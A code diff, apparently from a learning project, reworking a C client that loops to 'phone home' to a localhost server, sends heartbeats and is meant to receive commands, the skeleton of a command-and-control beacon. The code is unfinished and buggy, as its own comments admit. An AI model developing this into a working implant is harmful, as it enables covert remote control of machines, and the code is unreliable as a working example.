@@ -21,12 +21,18 @@ int main() {
 
     char * client_id = client_id_generate();
 
-    while (1) {
+    while ( 1 == 1) {
         // phoning home
         printf("\nPhoning home\n");
+
+        //receiveing commands from server & doing jobs
+        
+        //stopping loop for some reason
         ph_value = phone_home(first_connection, client_id);
 
-        int first_connection = 1;
+        
+        printf("Past phoning home");
+        //int first_connection = 1;
 
         //printf("ph_value = %s", ph_value);
 
@@ -36,12 +42,6 @@ int main() {
             sleep(15);
             //for some reason it sleeps first, then prints?
         }
-
-        /*
-        else if (ph_value == "err") {
-            printf("ERR: %s", ph_value);
-            return -1;
-        }*/
 
         // catchall for if nothing matches, it assumes this is an error & exits
         // Err statemnts/more specifics come from return functions in phone_home
@@ -69,7 +69,8 @@ char * phone_home(int first_connection, char * client_id) {
     //AF_INET = ipv4, and SOCK_STREAM means tcp. I think the < is, if it returns greater than 0, exit, as the socket() function returned a 1 (aka fail)
     if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) { 
         printf("\n Socket creation error \n");
-        return "err";
+        return "continue";
+        //return "err";
     }
 
     // set server address and port, IF there is no failure to connect
@@ -81,48 +82,45 @@ char * phone_home(int first_connection, char * client_id) {
     // convert IPv4 and IPv6 addresses from text to binary form
     if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0) { //does some conversion, not 100% the logic behind it
         printf("\nInvalid address/ Address not supported \n");
-        return "err";
+        return "continue";
+        //return "err";
         //return -1;
     }
     
-    // connect to server (on a 5 second loop)
-    //again if the connect function returns a 1 (aka fail) then break and error 
-
-    // connect(sockconnect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)et file descriptor, pointer to server address & port, size of struct socketaddr)
-
-    //impleemnt retry later
-    //while (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
-        //printf("\nConnection Failed \n");
-        //sleep(5);
-    //}
-
-    connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
-    
-    // send message to server
-    //send(sock file, message, length of message, 0 = no special flags)
-
-    //send(sock, hello, strlen(hello), 0);
-    //printf("Hello message sent\n");
-    //send_response(sock, hello);
-    
-    //// initial Contact
-    /*printf("%i\n", first_connection);
-    if ( first_connection == 0 ) {
-        send_response(sock, client_id);
+    // heartbeat: on failed connection, 'wait' for X time & try to reconnect again. 
+    if(connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr))<=0){
+        printf("Connection error");
         return "continue";
-    }*/
+    }
+    
+    
+    // if connect does not error out/not connect, run decision_tree, otherwise wait (return continue)
+
+}
+
+//need to get proper variables passed here, atm the loop workds, but this is not set up yet
+char * decision_tree(sock, valread, buffer) {
 
     if ( 1 == 2){
+        printf("This shouldnt be running");
     }
 
     else {
         // heartbeat, aka re connecting to server
-        send_response(sock, "heartbeat");
 
-        printf("Sending heartbeat");
-        valread = read(sock, buffer, 1024);
+        //err is in this function
 
-        printf("RECEIVED BACK: %s\n", buffer);
+        if (send_response(sock, "heartbeat")!=0) {
+            printf("Sending error");
+            return "continue";
+        }
+
+        else {
+            printf("Sending the heartbeat");
+            valread = read(sock, buffer, 1024);
+
+            printf("RECEIVED BACK: %s\n", buffer);
+        }
     }
 
     ///// Decision tree
@@ -181,13 +179,20 @@ char * phone_home(int first_connection, char * client_id) {
 int send_response(int sock, char *response) {
     printf("Sending '%s'\n", response);
 
+
+    // this is hanging due to no timeout I think. No idea why the program is ending though
+    //wiat... why is it trying to send a message if its not connected??
     if (send(sock, response, strlen(response),0 ) < 0) {
         perror("sending error");
+        return -1;
     }
     
-    //send(sock, response, strlen(response),0);
-    printf("DEBUG: Response sent successfully==========\n\n");
-    return 0;
+    else {
+        //send(sock, response, strlen(response),0);
+        printf("DEBUG: Response sent successfully==========\n\n");
+        return 0;
+    }
+
 }
 
 
